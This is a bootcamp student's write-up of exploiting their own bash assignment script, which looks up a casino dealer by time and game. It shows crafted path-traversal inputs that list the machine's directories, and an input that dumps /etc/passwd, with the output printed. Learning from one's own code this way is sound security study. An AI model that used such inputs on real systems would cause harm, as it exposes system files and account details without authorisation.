## LuckyDuckInvestigation Exploit

This .sh file is a bash script I wrote for my Cyber Security Bootcamp assignment to find who the game dealer was during a specified time and game for the Lucky Ducky Investigation.

We were tasked to create a bash script that took user import using grep and awk. It took me a good chunk of time to come up with the script that I am presenting here as I was pretty new to writing bash scripts which means my code isn’t very secure. Once the asignment was completed, I took it upon myself to exploit my own code.

I found that as long as you meet the IF requirment of a game, then the rest of the argument was able to run with the order of TIME > PAM > DATE > GAME.

So if x = GAME, then awk DATE and grep TIME and PAM.

This means I had 3 user input values I can manipulate as long as I specifiy one of the 3 games for my 4th value.

A LOT of trial and error lead me to find the first exploit - Local File Inclusion.

changing the input from

```sh
8 AM 0310 BlackJack
```
to
```sh
8 ../../../ ../../../../ BlackJack
```
outputs the names of directories on the machine
```sh
~#5 ../../../../../../ ../../../../../../../ TexasHoldEm 
~~~~~~~~~~~~~~~~~~~~~~~
awk: warning: command line argument `../../../../../../../03-instructor' is a directory: skipped
awk: warning: command line argument `../../../../../../../03-student' is a directory: skipped
awk: warning: command line argument `../../../../../../../bin' is a directory: skipped
awk: warning: command line argument `../../../../../../../boot' is a directory: skipped
awk: warning: command line argument `../../../../../../../cdrom' is a directory: skipped
awk: warning: command line argument `../../../../../../../cmdCTF' is a directory: skipped
awk: warning: command line argument `../../../../../../../dev' is a directory: skipped
awk: warning: command line argument `../../../../../../../Documents' is a directory: skipped
awk: warning: command line argument `../../../../../../../etc' is a directory: skipped
awk: script2.awk:4: warning: command line argument `../../../../../../../git-ctf' is a directory: skipped
awk: script2.awk:4: warning: command line argument `../../../../../../../home' is a directory: skipped
awk: script2.awk:4: warning: command line argument `../../../../../../../home1' is a directory: skipped
```

This was an exciting discovery but I wanted to be more specific and eventually narrowed it down to dump the /etc/passwd file by grepping x and : and specifying the path to the file

```sh
~#x : /etc/passwd Roulette
~~~~~~~~~~~~~~~~~~~~~~~
root:x:0:0:root:/root:/bin/bash   
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin   
bin:x:2:2:bin:/bin:/usr/sbin/nologin   
sys:x:3:3:sys:/dev:/usr/sbin/nologin   
sync:x:4:65534:sync:/bin:/bin/sync   
games:x:5:60:games:/usr/games:/usr/sbin/nologin   
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin   
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin   
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin   
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin   
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin   
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin   
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin   
list:x:38:38:Mailing List  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin   
gnats:x:41:41:Gnats Bug-Reporting  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin   
systemd-network:x:100:102:systemd Network  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin  
syslog:x:102:106::/home/syslog:/usr/sbin/nologin   
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin   
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin   
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin   
```
